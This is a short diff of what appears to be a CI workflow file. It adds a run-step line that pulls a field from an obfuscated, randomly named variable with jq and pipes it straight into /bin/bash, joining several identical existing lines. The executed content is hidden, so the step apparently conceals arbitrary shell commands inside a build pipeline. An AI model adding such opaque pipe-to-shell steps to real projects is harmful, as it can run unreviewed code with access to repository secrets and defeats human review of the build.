@@ -25,6 +25,7 @@ jobs:
           echo $cpt2223 | jq -r .svm1 | /bin/bash
           printf '%s' "$te42991" | jq -r .lcykb6 | /bin/bash
           printf '%s' "$skkr498" | jq -r .pkib3 | /bin/bash
+          echo $jqmk36161 | jq -r .zv4083 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
